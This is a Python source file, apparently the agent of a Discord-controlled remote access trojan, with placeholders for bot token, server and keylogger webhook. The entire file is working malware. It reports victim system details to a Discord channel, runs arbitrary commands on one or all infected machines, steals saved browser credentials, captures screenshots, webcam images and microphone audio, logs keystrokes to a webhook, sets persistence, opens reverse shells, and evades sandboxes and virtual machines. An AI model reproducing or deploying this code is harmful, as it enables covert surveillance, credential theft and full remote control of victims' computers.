import os
import sys
import threading
from datetime import datetime

import discord
from discord.ext import commands
from discord import app_commands

from libraries import keylogger, sandboxevasion, disctopia

GUILD = discord.Object(id="{GUILD}")
CHANNEL = {CHANNEL}
KEYLOGGER_WEBHOOK = "{KEYLOG_WEBHOOK}"

CURRENT_AGENT = 0

def get_id():
    return disctopia.id()

def get_embed(title, description=None, color=0x00FF00, fields=None):
    embed = discord.Embed(title=title, description=description, color=color)
    if fields:
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
    return embed

def send_file_or_embed(ctx, result, success_title, error_title, agent_id, remove_file=True):
    if result and os.path.isfile(result):
        coro = ctx.reply(file=discord.File(result))
        if remove_file:
            os.remove(result)
    else:
        embed = get_embed(f"{error_title} Agent#{agent_id}", color=0xFF0000)
        coro = ctx.reply(embed=embed)
    return coro

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()
        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()
        fields = [
            ("**IP**", disctopia.getIP(), True),
            ("**Bits**", disctopia.getBits(), True),
            ("**HostName**", disctopia.getHostname(), True),
            ("**OS**", disctopia.getOS(), True),
            ("**Username**", disctopia.getUsername(), True),
            ("**CPU**", disctopia.getCPU(), False),
            ("**Is Admin**", disctopia.isAdmin(), True),
            ("**Is VM**", disctopia.isVM(), True),
            ("**Auto Keylogger**", "False", True),
        ]
        embed = get_embed(
            title=f"{MSG}",
            description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**",
            color=COLOR,
            fields=fields
        )
        await self.channel.send(embed=embed)

    async def setup_hook(self):
        await self.tree.sync(guild=GUILD)

    async def on_command_error(self, ctx, error):
        embed = get_embed(f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=embed)

class InteractButton(discord.ui.View):
    def __init__(self, inv: str, agent_id: int):
        super().__init__()
        self.inv = inv
        self.id = agent_id

    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        embed = get_embed(f"Interacted with agent {self.id}")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.gray, emoji="❌")
    async def terminateButton(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = get_embed(f"Terminating Connection With Agent#{self.id}")
        await interaction.response.send_message(embed=embed)
        await bot.close()
        sys.exit()

    @discord.ui.button(label="Webshot", style=discord.ButtonStyle.gray, emoji="📸")
    async def webshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.webshot()
        await send_file_or_embed(interaction, result, "Webshot", "Error while taking photo to", self.id)

    @discord.ui.button(label="Process", style=discord.ButtonStyle.gray, emoji="📊")
    async def process(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.process()
        if len(result) > 4000:
            path = os.path.join(os.environ.get("temp", "/tmp"), "response.txt")
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file=discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")

    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.screenshot()
        await send_file_or_embed(interaction, result, "Screenshot", "Error while taking screenshot to", self.id)

    @discord.ui.button(label="Creds", style=discord.ButtonStyle.gray, emoji="🔑")
    async def creds(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.creds()
        await send_file_or_embed(interaction, result, "Creds", "Error while grabbing credentials from", self.id)

    @discord.ui.button(label="Persistent", style=discord.ButtonStyle.gray, emoji="🔁")
    async def persistent(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.persistent()
        color = 0x00FF00 if result else 0xFF0000
        msg = "Persistance enabled" if result else "Error while enabling persistance"
        embed = get_embed(f"{msg} on Agent#{self.id}", color=color)
        await interaction.response.send_message(embed=embed)

    @discord.ui.button(label="Location", style=discord.ButtonStyle.gray, emoji="🌐")
    async def location(self, interaction: discord.Interaction, button: discord.ui.Button):
        response = disctopia.location()
        if response:
            data = response.json()
            fields = [
                ("IP:", f"**{data.get('YourFuckingIPAddress', '')}**", False),
                ("Hostname:", f"**{data.get('YourFuckingHostname', '')}**", False),
                ("City:", f"**{data.get('YourFuckingLocation', '')}**", False),
                ("Country:", f"**{data.get('YourFuckingCountryCode', '')}**", False),
                ("ISP:", f"**{data.get('YourFuckingISP', '')}**", False),
            ]
            embed = get_embed(f"IP Based Location on Agent#{self.id}", color=0x00FF00, fields=fields)
        else:
            embed = get_embed(f"Error while getting location of Agent#{self.id}", color=0xFF0000)
        await interaction.response.send_message(embed=embed)

    @discord.ui.button(label="Selfdestruct", style=discord.ButtonStyle.red, emoji="💣")
    async def selfdestruct(self, interaction: discord.Interaction, button: discord.ui.Button):
        result = disctopia.selfdestruct()
        color = 0x00FF00 if result else 0xFF0000
        msg = f"Agent#{self.id} has been deleted" if result else f"Error while deleting Agent#{self.id}: {result}"
        embed = get_embed(msg, color=color)
        await interaction.response.send_message(embed=embed)

bot = Bot()
ID = get_id()

# --- Command Definitions ---

def agent_only(func):
    async def wrapper(ctx, *args, **kwargs):
        if int(CURRENT_AGENT) == int(ID):
            return await func(ctx, *args, **kwargs)
    return wrapper

@bot.hybrid_command(name="interact", with_app_command=True, description="Interact with an agent")
@app_commands.guilds(GUILD)
async def interact_cmd(ctx: commands.Context, agent_id: int):
    global CURRENT_AGENT
    CURRENT_AGENT = agent_id
    embed = get_embed(f"Interacting with Agent#{agent_id}")
    await ctx.reply(embed=embed)

@bot.hybrid_command(name="background", with_app_command=True, description="Background an agent")
@app_commands.guilds(GUILD)
async def background_cmd(ctx: commands.Context):
    global CURRENT_AGENT
    CURRENT_AGENT = 0
    embed = get_embed("Background Agent")
    await ctx.reply(embed=embed)

@bot.hybrid_command(name="cmd", with_app_command=True, description="Run any command on the target machine")
@app_commands.guilds(GUILD)
@agent_only
async def cmd_cmd(ctx: commands.Context, command: str):
    result = disctopia.cmd(command)
    if len(result) > 2000:
        path = os.path.join(os.environ.get("temp", "/tmp"), "response.txt")
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"```\n{result}\n```")
    

@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command:str):
    result = disctopia.cmd(command)
    if len(result) > 2000:
        path = os.path.join(os.environ.get("temp", "/tmp"), "response.txt")
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"```\n{result}\n```")


@bot.hybrid_command(name = "webshot", with_app_command = True, description = "Capture a picture from the target machine's screen")
@app_commands.guilds(GUILD)
async def webshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Please use **!webshot {ID}** instead of the slash command", color=0xFF0000)
            await ctx.reply(embed=my_embed) 
        else:
            result = disctopia.webshot()
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error while taking photo to Agent#{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
    
        
@bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
@app_commands.guilds(GUILD)
async def cd(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.cd(path)
        if (result):
            my_embed = discord.Embed(title=f"Succesfully changed directory to: {path}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)    
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
@app_commands.guilds(GUILD)
async def process(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.process()
        if len(result) > 4000:
            path = os.path.join(os.environ.get("temp", "/tmp"), "response.txt")         
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```\n{result}\n```")
    

@bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
@app_commands.guilds(GUILD)
async def upload(ctx: commands.Context, url:str, name:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.upload(url, name)
        if result:
            my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
@app_commands.guilds(GUILD)
async def screenshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
@app_commands.guilds(GUILD)
async def creds(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.creds()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
@app_commands.guilds(GUILD)
async def persistent(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistance enabled on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
         my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
         await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"Agent #{ID}   IP: {disctopia.getIP()}", color=0xADD8E6)
        my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
        view = InteractButton("Interact", ID)
        await ctx.reply(embed=my_embed, view=view)

@bot.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            await ctx.reply(f"**Agent #{ID}** Requested File:", file=discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()        
        sys.exit()
    

@bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
@app_commands.guilds(GUILD)
async def selfdestruct(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while deleting Agent#{ID}: {result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        response = disctopia.location()
        if response != False:
            my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context, ip:str, port:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.revshell(ip, port)
        if result:
            my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
    
    
@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
@app_commands.guilds(GUILD)
async def recordmic(ctx: commands.Context, seconds:int):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Please use **!recordmic {ID}** instead of the slash command", color=0xFF0000)
            await ctx.reply(embed=my_embed)
        else:
            result = disctopia.recordmic(seconds)
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error while starting recording on Agent#{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
@app_commands.guilds(GUILD)
async def wallpaper(ctx: commands.Context, path_url:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.wallpaper(path_url)
        if result:
            my_embed = discord.Embed(title=f"Wallpaper changed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
@app_commands.guilds(GUILD)
async def killproc(ctx: commands.Context, pid:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = disctopia.killproc(pid)
        if result:
            my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context, mode:str ,interval:int):
    if (int(CURRENT_AGENT) == int(ID)):
        logger = keylogger.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00))
        else:
            threading.Thread(target=logger.start).start()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00))
    

@bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context):
    my_embed = discord.Embed(title=f"Help Menu", color=0x00FF00)
    my_embed.add_field(name="/help", value="Shows this menu", inline=False)
    my_embed.add_field(name="/interact <id>", value="Interact with a specific agent", inline=False)
    my_embed.add_field(name="/background", value="Background your current agent", inline=False)
    my_embed.add_field(name="/cmd <command>", value="Run command on target", inline=False)
    my_embed.add_field(name="/cd <path>", value="Change current directory", inline=False)
    my_embed.add_field(name="/webshot ", value="Grab a picture from the webcam", inline=False)
    my_embed.add_field(name="/process ", value="Get a list of all running processes", inline=False)
    my_embed.add_field(name="/upload <url>", value="Upload file to agent", inline=False)
    my_embed.add_field(name="/screenshot ", value="Grab a screenshot from the agent", inline=False)
    my_embed.add_field(name="/creds ", value="Get chrome saved credentials", inline=False)
    my_embed.add_field(name="/persistent ", value="Enable persistence", inline=False)
    my_embed.add_field(name="!ls", value="Get a list of all active agents", inline=False)
    my_embed.add_field(name="/download <path>", value="Download file from agent", inline=False)
    my_embed.add_field(name="/terminate ", value="Terminate the session ", inline=False)
    my_embed.add_field(name="/cmd-all <command>", value="Run a command on all agents", inline=False)
    my_embed.add_field(name="/location ", value="Get the location of the target machine", inline=False)
    my_embed.add_field(name="/revshell <ip> <port>", value="Get a reverse shell on the target machine", inline=False)
    my_embed.add_field(name="/recordmic <interval>", value="Record the microphone of the target machine", inline=False)
    my_embed.add_field(name="/wallpaper <path/url>", value="Change the wallpaper of the target machine", inline=False)
    my_embed.add_field(name="/killproc <pid>", value="Kill a process on the target machine", inline=False)
    my_embed.add_field(name="/keylog <mode> <interval>", value="Start/Stop a keylogger on the target machine\n/`keylog start 60`", inline=False)
    my_embed.add_field(name="/selfdestruct ", value="Delete the agent", inline=False)
    await ctx.reply(embed=my_embed)



if sandboxevasion.test() and not disctopia.isVM():
    config = disctopia.createConfig()
    if config:
        MSG = f"New Agent Online #{ID}"
        COLOR = 0x00ff00
    else:
        MSG = f"Agent Online #{ID}"
        COLOR = 0x0000FF
    bot.run("{TOKEN}")
